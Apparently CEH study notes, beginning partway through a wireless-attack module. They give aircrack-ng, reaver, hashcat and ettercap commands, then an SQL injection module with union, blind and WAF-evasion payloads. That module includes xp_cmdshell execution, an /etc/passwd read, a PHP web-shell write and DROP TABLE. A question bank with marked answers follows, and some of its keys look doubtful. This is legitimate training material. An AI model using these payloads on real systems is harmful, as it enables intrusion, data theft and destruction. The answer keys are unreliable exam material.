   - Capture and examine packets (e.g., via Wireshark, airodump-ng).
3. Launch of Wireless Attacks
   - Deauthentication, Fake AP (Evil Twin), ARP poisoning, DoS, etc.
4. Wi-Fi Encryption Cracking
   - Capturing WPA(2) handshakes, brute forcing or dictionary attacks, WEP IV exploitation.
5. Wi-Fi Network Compromise
   - Once access is gained, attacker can pivot to internal resources.

#### War-X Tactics

- War-walking: Scanning Wi-Fi on foot.
- War-driving: Scanning Wi-Fi in a vehicle.
- War-chalking: Marking discovered Wi-Fi on public surfaces with chalk symbols.
- War-flying: Using drones/aircraft to scan networks from the air.

------

### 9. Finding WPS-Enabled APs with `wash`

`wash` (part of Reaver’s toolset) scans for APs that have WPS enabled:

| Argument | Description                                                  |
| -------- | ------------------------------------------------------------ |
| -i       | Specify the interface (e.g., `-i wlan0mon`).                 |
| -a       | Show all APs, including those locked or with WPS disabled states. |
| -f       | Faster refresh rate for displayed APs.                       |
| -c       | Restrict scanning to a specific channel (e.g., `-c 6`).      |
| -o       | Output results to a file (e.g., `-o results.txt`).           |
| -m       | Set a minimum RSSI to filter out weak AP signals.            |
| -d       | Exclude specific BSSIDs from the scan.                       |
| -5       | Force scanning in 5 GHz range.                               |
| -s       | Silent/short mode (fewer details).                           |
| -u       | Attempt to unlock locked WPS (in specific conditions).       |

Example:

```bash
wash -i wlan0mon -c 1 -o wps_list.txt
```

Scans channel 1 for WPS-enabled APs and writes results to `wps_list.txt`.

------

### 10. Aircrack-ng Suite

The Aircrack-ng suite is a collection of tools for auditing (and potentially attacking) wireless networks. Below is an in-depth overview with commonly used arguments and examples.

#### 10.1 Common Tools and Purpose

1. Airmon-ng

   - Manages wireless interfaces in Monitor mode.
   - Syntax: `airmon-ng start <interface>` / `airmon-ng stop <interface>`
   - Example: `airmon-ng start wlan0` switches `wlan0`  to `wlan0mon` (Monitor mode).

2. Airodump-ng

   - Captures and displays wireless traffic, listing APs, clients, encryption, signal strength, etc.

   - Key arguments:

     - `-c <channel>`: Listen on a specific channel.
     - `--bssid <MAC>`: Filter capture to a specific BSSID.
     - `-w <file>`: Write output to capture files (`.cap`, `.csv`).

   - Example:

     ```bash
     airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake_capture wlan0mon
     ```

     Sniffs channel 6, looking specifically for BSSID `00:11:22:33:44:55`, saving data into `handshake_capture.cap`.

3. Aircrack-ng

   - Used to crack WEP and WPA(2) keys.

   - Key arguments:

     - `-w <wordlist>`: Dictionary file for brute force attacks.
     - `-b <BSSID>`: Target a specific BSSID in the capture.
     - `-e <ESSID>`: Target a specific network name if multiple networks are in the capture.

   - Example:

     ```bash
     aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake_capture.cap
     ```

     Attempts to crack the WPA(2) handshake in `handshake_capture.cap` using the wordlist.

4. Aireplay-ng

   - Packet injection tool (e.g., deauthentication, fake authentication, ARP request replay, etc.).

   - Key arguments:

     - `--deauth <count>`: Sends deauthentication frames.
     - `-a <AP_MAC>`: MAC address of the target AP.
     - `-c <Client_MAC>`: MAC address of the client to deauth (optional if targeting all).

   - Example:

     ```bash
     aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
     ```

     Sends 5 deauth frames to a specific client on the AP.

5. Airbase-ng

   - Creates a rogue AP (Evil Twin), or fake AP for MITM and phishing.

   - Example:

     ```bash
     airbase-ng -e "FakeSSID" -c 6 wlan0mon
     ```

     Sets up a fake AP named `"FakeSSID"` on channel 6 using `wlan0mon`.

6. Airdecap-ng

   - Decrypts WEP/WPA/WPA2 capture files if you know the key.

   - Example:

     ```bash
     airdecap-ng -w mypassword handshake_capture.cap
     ```

     Attempts to decrypt traffic in `handshake_capture.cap` using the supplied key.

7. Airdrop-ng / Airgraph-ng

   - Airdrop-ng: Can enforce deauth on specific targets (e.g., intruders).
   - Airgraph-ng: Visualizes relationships between APs and stations.

------

#### 10.2 Aircrack-ng Arguments Table

Below is a focused table of Aircrack-ng’s most commonly used arguments (for cracking phase):

| Argument        | Purpose / Explanation                                        | Example Usage                                       |
| --------------- | ------------------------------------------------------------ | --------------------------------------------------- |
| `-w <wordlist>` | Specify a dictionary file for brute force or dictionary attack. | `-w /usr/share/wordlists/rockyou.txt`               |
| `-b <BSSID>`    | Target a specific BSSID in the capture file.                 | `-b 00:11:22:33:44:55`                              |
| `-e <ESSID>`    | If multiple ESSIDs are in the capture, target one specifically by name. | `-e "HomeNetwork"`                                  |
| `-l <file>`     | Write the cracked key to a file in plaintext.                | `-l cracked_key.txt`                                |
| `-p <threads>`  | Number of threads (for WEP or wordlist splitting tasks).     | `-p 4` (use 4 threads)                              |
| `-q`            | Quiet/less verbose output mode.                              | `-q`                                                |
| `-S`            | Bruteforce search for WEP or WPA if uncertain.               | `-S` (rarely used; tries to auto-detect encryption) |
| `--stat`        | Display advanced statistics during cracking.                 | `--stat`                                            |
| `--help` / `-h` | Show help text for Aircrack-ng.                              | `aircrack-ng -h`                                    |

Technical Example:

```bash
aircrack-ng -w /usr/share/wordlists/custom_list.txt -b 12:34:56:78:9A:BC -l mycrackedkey.txt handshake_capture.cap
```

- Uses a custom wordlist `custom_list.txt`.
- Targets BSSID `12:34:56:78:9A:BC`.
- Saves the cracked key to `mycrackedkey.txt`.
- Cracks the handshake from `handshake_capture.cap`.

------

### 11. Other Tools: Hashcat, Reaver, Ettercap

#### 11.1 Hashcat

- Purpose: A GPU-accelerated password recovery tool. Can crack WPA/WPA2 handshakes offline using PMKID or captured 4-way handshakes.
- Common Usage:
  1. Convert `.cap` handshake to `hccapx` or `.hc22000` format (e.g., via `cap2hccapx` or `hcxpcapngtool`).
  2. Run Hashcat with a wordlist or rules.

Example (WPA2 cracking):

```bash
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt -w 3 --force
```

- `-m 22000`: Hash mode for WPA-PMKID-PBKDF2 or WPA-EAPOL-PBKDF2.
- `handshake.hc22000`: The converted capture file.
- `-w 3`: Workload profile (3 is a balanced approach).
- `--force`: Force Hashcat to run even if some warnings appear.

#### 11.2 Reaver

- Purpose: Exploits the WPS PIN vulnerability to obtain the WPA(2) passphrase.

- Example:

  ```bash
  reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -K 1
  ```

  - `-i`: Interface (in monitor mode).
  - `-b`: Target BSSID.
  - `-c`: Channel.
  - `-vv`: Very verbose output.
  - `-K 1`: Enables small diff WPS P/N switch for speed improvement. (Parameters may differ based on Reaver version.)

#### 11.3 Ettercap

- Purpose: A comprehensive suite for man-in-the-middle (MITM) attacks and network sniffing, including ARP poisoning.

- Example

  (ARP poisoning in a wireless network):

  ```bash
  # Enable IP forwarding first (on Linux):
  echo 1 > /proc/sys/net/ipv4/ip_forward
  
  # Then run Ettercap:
  ettercap -T -i wlan0 -M arp /192.168.1.10// /192.168.1.1//
  ```

  - `-T`: Text mode.
  - `-i wlan0`: Interface to use (wireless).
  - `-M arp`: ARP poisoning MITM.
  - `/192.168.1.10//`: Target host.
  - `/192.168.1.1//`: Gateway or router.

------

### 12. Wireless Attack Countermeasures & Best Practices

#### 12.1 Multi-Layered Defense Approach

1. Signal Security: Adjust transmit power, place APs in secure areas to limit external coverage.
2. Connection Security: Enforce WPA2 or WPA3 with strong passphrases.
3. Device Security: Firmware updates for APs, disable unused services (WPS if not needed).
4. Data Protection: Use end-to-end encryption (VPN or TLS) on sensitive data.
5. Network Protection: Implement VLANs, firewalls, Wireless Intrusion Detection/Prevention Systems (WIDS/WIPS).
6. End-User Protection: Train users on safe Wi-Fi practices (avoid rogue APs, use strong passwords).

#### 12.2 Defenses Against WPA/WPA2/WPA3 Cracking

- Use robust passphrases (at least 12+ characters, random).
- Disable WPS (unless absolutely required, but still risky).
- Upgrade to WPA3 if hardware supports it.
- Periodically rotate keys (especially in enterprise settings).

#### 12.3 Best Practices

1. Configuration
   - Update AP firmware regularly.
   - Disable legacy protocols (WEP, TKIP).
   - Avoid default SSIDs and admin credentials.
   - Use VLAN segmentation for guest vs. internal networks.
2. SSID Settings
   - Use non-descriptive SSIDs.
   - Consider hiding the SSID broadcast (minor obfuscation).
   - Monitor for rogue APs or SSID clones.
3. Authentication
   - Prefer WPA2-Enterprise or WPA3-Enterprise for corporate environments (RADIUS-based).
   - Enforce strong PSK complexity if using WPA2-PSK.
   - Regular passphrase rotation policy (e.g., every 90 days).

## Module 15 - SQL Injection

### 1. Overview of SQL Injections

Main Types

- Inbound (In-Band): Error-based, Union-based (same channel for injection + data retrieval)
- Blind (Inferential): No direct data display; infer via boolean or time
- Out-of-Band: Alternative channels (DNS, HTTP requests) for exfiltration

------

### 2. Common SQL Injection Techniques

#### 2.1 Error-Based SQL Injections

- Definition: Leverage DB error messages to reveal data structure.

- Examples:

  ```sql
  ' OR 1=1; -- 
  ```

  If an error reveals table or column names, you confirm vulnerability.

#### 2.2 Union-Based SQL Injections

- Definition: Use `UNION` to combine results of multiple SELECT statements.

- Example:

  ```sql
  ' UNION SELECT username, password FROM users; --
  ```

#### 2.3 Other In-Band Variants

- **End-of-Line Commands** (`--`, `#`):

  ```sql
  ' OR '1'='1' -- 
  ```

- In-Line Comments (`/* ... */`)

- Piggybacked Queries:

  ```sql
  ' ; DROP TABLE users; --
  ```

#### 2.4 Blind (Inferential) SQL Injection

- Boolean-Based

  ```sql
  ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
  ```

- Time-Based

  ```sql
  ' OR IF(1=1,SLEEP(5),0) --
  ```

#### 2.5 Out-of-Band SQL Injection

- Definition: Use alternate channels (DNS requests, HTTP callbacks) for exfiltration.
- Key Point: Attacker triggers DB queries that send data to a remote server.

------

### 3. SQL Injection Methodology

#### 3.1 Information Gathering

- Identify Data Entry Paths: Form fields, query parameters, headers, cookies.
- Tools: Burp Suite, Tamper Dev.

#### 3.2 Extracting Information via Error Messages

- Parameter Tampering: Insert special characters to produce verbose errors.
- Identify DB Engine: MySQL, MSSQL, Oracle, PostgreSQL each have distinct error outputs.

#### 3.3 Testing for Vulnerabilities

- Common Test Strings:

  - `1' OR '1'='1`
  - `' AND 1=2 --`

- Additional Methods:

  - Function Testing, Fuzz Testing, Static & Dynamic Testing

#### 3.4 SQL Injection Black Box Pen Testing

- Detecting SQL Injection Issues: Attempting crafted inputs.
- Detecting Input Sanitization: Checking for special character filters.
- Detecting Truncation Issues
- Detecting SQL Modifications: WAF or filters rewriting queries.

------

### 4. Performing Different SQL Injections: Practical Examples

- Error-Based

  ```sql
  http://target.com/index.php?id=1' AND 1=0--
  ```

- Union-Based

  ```sql
  http://target.com/index.php?id=1 UNION SELECT username, password FROM users--
  ```

- Blind (Boolean)

  ```sql
  http://target.com/index.php?id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
  ```

- Blind (Time)

  ```sql
  http://target.com/index.php?id=1' OR IF(1=1,SLEEP(5),0)--
  ```

------

### 5. Common SQL Keywords

| Keyword       | Purpose                                  |
| ------------- | ---------------------------------------- |
| `SELECT`      | Retrieve data from tables                |
| `FROM`        | Specify table(s)                         |
| `WHERE`       | Filter rows                              |
| `UNION`       | Combine multiple SELECT results          |
| `INSERT`      | Add new records                          |
| `UPDATE`      | Modify existing records                  |
| `DELETE`      | Remove existing records                  |
| `DROP`        | Delete tables or databases               |
| `CREATE`      | Create DB objects                        |
| `ALTER`       | Modify DB schema                         |
| `EXEC`        | Execute stored procedures (MSSQL)        |
| `xp_cmdshell` | Execute OS commands (MSSQL)              |
| `REGEXP`      | Pattern matching (MySQL, etc.)           |
| `LIKE`        | Pattern matching                         |
| `LIMIT`       | Restrict number of returned rows (MySQL) |
| `ORDER BY`    | Sort result set                          |
| `GROUP BY`    | Group rows for aggregate functions       |

------

### 6. Bypassing Firewalls to Perform SQL Injection

Each method below includes a short description and example:

1. Normalization Method

   - Idea: Rewrite or normalize the query to bypass naive signature-based filtering.

   - Example: Changing case or spacing:

     ```sql
     SeLeCt * FrOm users 
     ```

     The firewall might only filter `SELECT FROM`.

2. HPP (HTTP Parameter Pollution) Technique

   - Idea: Send multiple parameters with the same name to confuse filters.

   - Example:

     ```
     http://target.com/index.php?id=1&id=2
     ```

     The application or WAF might parse `id`

      differently, potentially enabling injection.

3. HPF (HTTP Parameter Fragmentation) Technique

   - Idea: Split parameters across multiple fragments to hide malicious input.

   - Example:

     ```
     GET /index.php?i
     d=1' OR '1'='1 HTTP/1.1
     ```

     The firewall might fail to reassemble `id`.

4. Blind SQL Injection

   - Idea: Use boolean/time methods that do not rely on direct error messages.

   - Example:

     ```
     http://target.com/product.php?id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
     ```

     No direct error message, but page behavior changes.

5. Signature Bypass

   - Idea: Obfuscate known injection signatures (`UNION`, `SELECT`, etc.) using comments or string manipulations.

   - Example:

     ```sql
     'UN//ION SEL//ECT user, pass FR//OM users--
     ```

     Breaks typical pattern matching in WAF filters.

6. Buffer Overflow Method

   - Idea: Overload the input buffer with excessive or malformed input, tricking the system or firewall.

   - Example:

     ```
     id=<very_long_string_of_chars>...'%20OR%20'1'='1
     ```

     If the WAF crashes or mishandles large input, it may fail to filter the payload.

7. CRLF Technique

   - Idea: Inject carriage return (`\r`) and line feed (`\n`) to alter HTTP headers or queries.

   - Example (URL-encoded):

     ```
     http://target.com/index.php?id=1%0d%0aSELECT%20*%20FROM%20users--
     ```

     This might break the parser’s expected structure.

8. Integration Method

   - Idea: Merge malicious payload with legitimate data in ways the firewall does not detect.

   - Example:

     ```
     http://target.com/search?query=<script>alert()</script>&ref=' OR 1=1--
     ```

     The injection is “integrated” with normal script tags or other data to hide in plain sight.

------

### 7. Interacting with the Operating System

- OS Shell via DB

  - Some DB engines (e.g., MSSQL) allow commands via `xp_cmdshell`.

  - Example:

    ```sql
    '; EXEC xp_cmdshell 'dir C:\'; --
    ```

- File System Access

  - Use MySQL’s `LOAD_FILE()`, or MSSQL commands.

  - Example (MySQL):

    ```sql
    SELECT LOAD_FILE('/etc/passwd');
    ```

------

### 8. Creating Server Backdoors Using SQL Injection

- Getting OS Shell

  - Inject a PHP web shell if DB user can write files.

  - Example:

    ```sql
    SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
    ```

- Finding Directory Structure

  - Example (MySQL):

    ```sql
    SELECT @@datadir;
    ```

- Database Backdoor

  - Malicious triggers or stored procedures that run automatically.

------

### 9. `sqlmap` Usage Notes

| Parameter         | Meaning                                                 |
| ----------------- | ------------------------------------------------------- |
| `-u`              | Target URL, e.g., `-u "http://site.com/index.php?id=1"` |
| `--data`          | POST data                                               |
| `--dbs`           | Enumerate databases                                     |
| `--tables`        | Enumerate tables in a DB                                |
| `--columns`       | Enumerate columns in a table                            |
| `--dump`          | Dump database table entries                             |
| `--banner`        | Retrieve DB banner info                                 |
| `--current-user`  | Show current DB user                                    |
| `--current-db`    | Show current DB name                                    |
| `--os-shell`      | Attempt to get an interactive OS shell (if supported)   |
| `--technique=...` | Specify injection techniques (`B`, `E`, `U`, `T`, `S`)  |
| `--level=...`     | Set the test level                                      |
| `--risk=...`      | Set the risk level                                      |
| `--random-agent`  | Use a random HTTP User-Agent header                     |

#### Usage Examples

- Union-Based

  ```bash
  sqlmap -u "http://target.com/index.php?id=1" --technique=U --dump
  ```

- Error-Based

  ```bash
  sqlmap -u "http://target.com/item.php?item=1" --technique=E --columns
  ```

- Blind (Time-Based)

  ```bash
  sqlmap -u "http://target.com/search.php?q=test" --technique=T --time-sec=5
  ```

------

### 10. Evasion Techniques (IEDS Signature Evasion)

Short explanation + example:

1. Inline Command

   - Chain commands inline (e.g., with `;`).

   - Example:

     ```sql
     ' ; DROP TABLE users; --
     ```

2. Char Encoding

   - Use alternative encodings (UTF-8, etc.) to mask payload.

   - Example:

     ```
     %c2%a3 or other unicode transformations
     ```

3. String Concatenation

   - Break strings to evade filters.

   - Example:

     ```sql
     'un'+'ion sel'+'ect'
     ```

4. Obfuscated Code

   - Insert comments or random spacing.

   - Example:

     ```sql
     SELECT/*comment*/password FROM/*comment*/users
     ```

5. Manipulating White Space

   - Use tabs, line breaks, or comment blocks.

   - Example:

     ```sql
     UN//ION//SELECT
     ```

6. Hex Encoding

   - Convert payload to hex.

   - Example (MySQL):

     ```sql
     SELECT x'68656C6C6F'  -- 'hello'
     ```

7. Sophisticated Matches

   - Split known patterns with `||`, etc.

   - Example:

     ```sql
     UN||ION SEL||ECT ...
     ```

8. URL Encoding

   - Encode special chars (`' -> %27`, space -> `%20`).

   - Example:

     ```
     http://target.com?id=%27%20OR%20%271%27%3D%271
     ```

9. Null Byte

   - `%00` can terminate strings or bypass certain checks.

10. Case Variation

    - Changing letter cases: `SeLeCt`, `UnIon`.

11. IP Fragmentation

    - Split IP packets so WAF struggles to reconstruct the payload.

------

### 11. Countermeasures

- Database-Level Hardening
  - Restrict privileges
  - Disable dangerous stored procedures (e.g., `xp_cmdshell`)
  - Use secure defaults
- Application-Level Protections
  - Parameterized Queries/Prepared Statements
  - ORMs (built-in escaping)
  - Whitelist input validation
- Detection
  - Regex-based checks
  - IDS/WAF signature and anomaly detection
- Best Practices
  - Least Privilege principle
  - Escape/Sanitize all user input
  - Regular Audits and code reviews
  - Keep software patched and updated

# Questions Pack

Ces questions sont issues du site Exam

---

In this form of encryption algorithm, every individual block contains 64-bit data, and three keys are used, where each key consists of 56 bits. Which is this encryption algorithm?

- A. IDEA
- **B. Triple Data Encryption Standard**
- C. AES
- D. MD5 encryption algorithm

---

John is investigating web-application firewall logs and observers that someone is attempting to inject the following:

![image1](https://img.examtopics.com/312-50v13/image1.png)

What type of attack is this?

- A. SQL injection
- **B. Buffer overflow**
- C. CSRF
- D. XSS

---

John, a professional hacker, performs a network attack on a renowned organization and gains unauthorized access to the target network. He remains in the network without being detected for a long time and obtains sensitive information without sabotaging the organization.
Which of the following attack techniques is used by John?

- A. Insider threat
- B. Diversion theft
- C. Spear-phishing sites
- **D. Advanced persistent threat**

---

You are attempting to run an Nmap port scan on a web server. Which of the following commands would result in a scan of common ports with the least amount of noise in order to evade IDS?

- A. nmap -A - Pn
- B. nmap -sP -p-65535 -T5
- **C. nmap -sT -O -T0**
- D. nmap -A --host-timeout 99 -T1

---

This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as GCMP-256, HMAC-SHA384, and ECDSA using a 384-bit elliptic curve.
Which is this wireless security protocol?

- A. WPA3-Personal
- **B. WPA3-Enterprise**
- C. WPA2-Enterprise
- D. WPA2-Personal

---

What are common files on a web server that can be misconfigured and provide useful information for a hacker such as verbose error messages?

- A. httpd.conf
- B. administration.config
- **C. php.ini**
- D. idq.dll

---

Gerard, a disgruntled ex-employee of Sunglass IT Solutions, targets this organization to perform sophisticated attacks and bring down its reputation in the market. To launch the attacks process, he performed DNS footprinting to gather information about DNS servers and to identify the hosts connected in the target network. He used an automated tool that can retrieve information about DNS zone data including DNS domain names, computer names, IP addresses, DNS records, and network Whois records. He further exploited this information to launch other sophisticated attacks.
What is the tool employed by Gerard in the above scenario?

- A. Towelroot
- B. Knative
- C. zANTI
- **D. Bluto**

---

Tony is a penetration tester tasked with performing a penetration test. After gaining initial access to a target system, he finds a list of hashed passwords.
Which of the following tools would not be useful for cracking the hashed passwords?

- A. Hashcat
- B. John the Ripper
- C. THC-Hydra
- **D. netcat**

---

Which of the following Google advanced search operators helps an attacker in gathering information about websites that are similar to a specified target URL?

- A. [inurl:]
- B. [info:]
- C. [site:]
- **D. [related:]**

---

You are a penetration tester working to test the user awareness of the employees of the client XYZ. You harvested two employees’ emails from some public sources and are creating a client-side backdoor to send it to the employees via email.
Which stage of the cyber kill chain are you at?

- A. Reconnaissance
- **B. Weaponization**
- C. Command and control
- D. Exploitation

---

While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to determine whether the firewall is stateful or stateless, which of the following options would be best to use?

- **A. -sA**
- B. -sX
- C. -sT
- D. -sF

---

A newly joined employee, Janet, has been allocated an existing system used by a previous employee. Before issuing the system to Janet, it was assessed by Martin, the administrator. Martin found that there were possibilities of compromise through user directories, registries, and other system parameters. He also identified vulnerabilities such as native configuration tables, incorrect registry or file permissions, and software configuration errors.
What is the type of vulnerability assessment performed by Martin?

- A. Database assessment
- **B. Host-based assessment**
- C. Credentialed assessment
- D. Distributed assessment

---

Jane, an ethical hacker, is testing a target organization’s web server and website to identify security loopholes. In this process, she copied the entire website and its content on a local drive to view the complete profile of the site’s directory structure, file structure, external links, images, web pages, and so on. This information helps Jane map the website’s directories and gain valuable information.
What is the attack technique employed by Jane in the above scenario?

- A. Session hijacking
- **B. Website mirroring**
- C. Website defacement
- D. Web cache poisoning

---

An organization is performing a vulnerability assessment for mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization’s machines to detect which ports are attached to services such as an email server, a web server, or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests.
What is the type of vulnerability assessment solution that James employed in the above scenario?

- A. Service-based solutions
- B. Product-based solutions
- C. Tree-based assessment
- **D. Inference-based assessment**

*Scanning services configurations and then start acting only on THESE services.*

---

Taylor, a security professional, uses a tool to monitor her company’s website, analyze the website’s traffic, and track the geographical location of the users visiting the company’s website.
Which of the following tools did Taylor employ in the above scenario?

- A. Webroot
- **B. Web-Stat**
- C. WebSite-Watcher
- D. WAFW00F

---

Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices. Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic information about their network. When analyzing the results of her Whois search, Becky notices that the IP was allocated to a location in Le Havre, France.
Which regional Internet registry should Becky go to for detailed information?

- A. ARIN
- B. LACNIC
- C. APNIC
- **D. RIPE**

---

Harry, a professional hacker, targets the IT infrastructure of an organization. After preparing for the attack, he attempts to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Using these techniques, he successfully deployed malware on the target system to establish an outbound connection.
What is the APT lifecycle phase that Harry is currently executing?

- **A. Initial intrusion**
- B. Persistence
- C. Cleanup
- D. Preparation

---

Robin, a professional hacker, targeted an organization’s network to sniff all the traffic. During this process, Robin plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the network. What is the attack performed by Robin in the above scenario?

- A. ARP spoofing attack
- **B. STP attack**
- C. DNS poisoning attack
- D. VLAN hopping attack

*STP: Spanning Tree Protocol*

---

An attacker utilizes a Wi-Fi Pineapple to run an access point with a legitimate-looking SSID for a nearby business in order to capture the wireless password. What kind of attack is this?

- A. MAC spoofing attack
- B. War driving attack
- C. Phishing attack
- **D. Evil-twin attack**

*EvilTwin: Setup a malicious wifi acess*

---

CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed Bob, a security professional, to build and incorporate defensive strategies against such attacks. Bob adopted a practice whereby only a list of entities such as the data type, range, size, and value, which have been approved for secured access, is accepted.
What is the defensive technique employed by Bob in the above scenario?

- **A. Whitelist validation**
- B. Output encoding
- C. Blacklist validation
- D. Enforce least privileges

---

Joe works as an IT administrator in an organization and has recently set up a cloud computing service for the organization. To implement this service, he reached out to a telecom company for providing Internet connectivity and transport services between the organization and the cloud service provider.
In the NIST cloud deployment reference architecture, under which category does the telecom company fall in the above scenario?

- A. Cloud consumer
- B. Cloud broker
- C. Cloud auditor
- **D. Cloud carrier**

---

Bobby, an attacker, targeted a user and decided to hijack and intercept all their wireless communications. He installed a fake communication tower between two authentic endpoints to mislead the victim. Bobby used this virtual tower to interrupt the data transmission between the user and real tower, attempting to hijack an active session. Upon receiving the user’s request, Bobby manipulated the traffic with the virtual tower and redirected the victim to a malicious website.
What is the attack performed by Bobby in the above scenario?

- **A. aLTEr attack**
- B. Jamming signal attack
- C. Wardriving
- D. KRACK attack

---

John, a professional hacker, targeted an organization that uses LDAP for accessing distributed directory services. He used an automated tool to anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch further attacks on the target organization.
What is the tool employed by John to gather information from the LDAP service?

- A. ike-scan
- B. Zabasearch
- **C. JXplorer**
- D. EarthExplorer

---

Annie, a cloud security engineer, uses the Docker architecture to employ a client/server model in the application she is working on. She utilizes a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. What is the component of the Docker architecture used by Annie in the above scenario?

- A. Docker objects
- **B. Docker daemon**
- C. Docker client
- D. Docker registries

---

Bob, an attacker, has managed to access a target IoT device. He employed an online tool to gather information related to the model of the IoT device and the certifications granted to it.
Which of the following tools did Bob employ to gather the above information?

- **A. FCC ID search**
- B. Google image search
- C. search.com
- D. EarthExplorer

---

What piece of hardware on a computer’s motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?

- A. CPU
- B. UEFI
- C. GPU
- **D. TPM**

*TPM: Trusted Platform Module*

---

Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application.
What is the type of web-service API mentioned in the above scenario?

- **A. RESTful API**
- B. JSON-RPC
- C. SOAP API
- D. REST API

---

To create a botnet, the attacker can use several techniques to scan vulnerable machines. The attacker first collects information about a large number of vulnerable machines to create a list. Subsequently, they infect the machines. The list is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures the spreading and installation of malicious code in little time. Which technique is discussed here?

- A. Subnet scanning technique
- B. Permutation scanning technique
- **C. Hit-list scanning technique.**
- D. Topological scanning technique

*Hit-list: create a list with vulnerable sites, known vulnerabilities.*

---

Nicolas just found a vulnerability on a public-facing system that is considered a zero-day vulnerability. He sent an email to the owner of the public system describing the problem and how the owner can protect themselves from that vulnerability. He also sent an email to Microsoft informing them of the problem that their systems are exposed to.
What type of hacker is Nicolas?

- A. Black hat
- **B. White hat**
- C. Gray hat
- D. Red hat

---

Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an attacker, noticed her activities several times and sent a fake email containing a deceptive page link to her social media page displaying all-new and trendy outfits. In excitement, Sophia clicked on the malicious link and logged in to that page using her valid credentials.
Which of the following tools is employed by Clark to create the spoofed email?

- **A. Evilginx**
- B. Slowloris
- C. PLCinject
- D. PyLoris

---

John, a disgruntled ex-employee of an organization, contacted a professional hacker to exploit the organization. In the attack process, the professional hacker installed a scanner on a machine belonging to one of the victims and scanned several machines on the same network to identify vulnerabilities to perform further exploitation.
What is the type of vulnerability assessment tool employed by John in the above scenario?

- **A. Agent-based scanner**
- B. Network-based scanner
- C. Cluster scanner
- D. Proxy scanner

*B seems to be ok too.*

---

Joel, a professional hacker, targeted a company and identified the types of websites frequently visited by its employees. Using this information, he searched for possible loopholes in these websites and injected a malicious script that can redirect users from the web page and download malware onto a victim's machine. Joel waits for the victim to access the infected web application so as to compromise the victim's machine.
Which of the following techniques is used by Joel in the above scenario?

- **A. Watering hole attack**
- B. DNS rebinding attack
- C. MarioNet attack
- D. Clickjacking attack

---

Security administrator John Smith has noticed abnormal amounts of traffic coming from local computers at night. Upon reviewing, he finds that user data have been exfiltrated by an attacker. AV tools are unable to find any malicious software, and the IDS/IPS has not reported on any non-whitelisted programs.
What type of malware did the attacker use to bypass the company’s application whitelisting?

- **A. File-less malware**
- B. Zero-day malware
- C. Phishing malware
- D. Logic bomb malware

---

Dorian is sending a digitally signed email to Poly. With which key is Dorian signing this message and how is Poly validating it?

- A. Dorian is signing the message with his public key, and Poly will verify that the message came from Dorian by using Dorian’s private key.
- B. Dorian is signing the message with Poly’s private key, and Poly will verify that the message came from Dorian by using Dorian’s public key.
- **C. Dorian is signing the message with his private key, and Poly will verify that the message came from Dorian by using Dorian’s public key.**
- D. Dorian is signing the message with Poly’s public key, and Poly will verify that the message came from Dorian by using Dorian’s public key.

---

Scenario: Joe turns on his home computer to access personal online banking. When he enters the URL www.bank.com, the website is displayed, but it prompts him to re-enter his credentials as if he has never visited the site before. When he examines the website URL closer, he finds that the site is not secure and the web address appears different.
What type of attack he is experiencing?

- A. DHCP spoofing
- B. DoS attack
- C. ARP cache poisoning
- **D. DNS hijacking**

---

Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session ID to the target employee. The session ID links the target employee to Boney’s account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boney’s account.
What is the attack performed by Boney in the above scenario?

- A. Forbidden attack
- B. CRIME attack
- C. Session donation attack
- **D. Session fixation attack**

*MITM: Man in the midlde; Donation attack does not exist.*

---

Kevin, a professional hacker, wants to penetrate CyberTech Inc’s network. He employed a technique, using which he encoded packets with Unicode characters. The company’s IDS cannot recognize the packets, but the target web server can decode them.
What is the technique used by Kevin to evade the IDS system?

- A. Session splicing
- B. Urgency flag
- **C. Obfuscating**
- D. Desynchronization

---

Suppose that you test an application for the SQL injection vulnerability. You know that the backend database is based on Microsoft SQL Server. In the login/password form, you enter the following credentials:

![image2](https://img.examtopics.com/312-50v13/image2.png)

Based on the above credentials, which of the following SQL commands are you expecting to be executed by the server, if there is indeed an SQL injection vulnerability?

- A. select * from Users where UserName = ‘attack’ ’ or 1=1 -- and UserPassword = ‘123456’
- B. select * from Users where UserName = ‘attack’ or 1=1 -- and UserPassword = ‘123456’
- C. select * from Users where UserName = ‘attack or 1=1 -- and UserPassword = ‘123456’
- **D. select * from Users where UserName = ‘attack’ or 1=1 --’ and UserPassword = ‘123456’**

---

Which of the following commands checks for valid users on an SMTP server?

- A. RCPT
- B. CHK
- **C. VRFY**
- D. EXPN

---

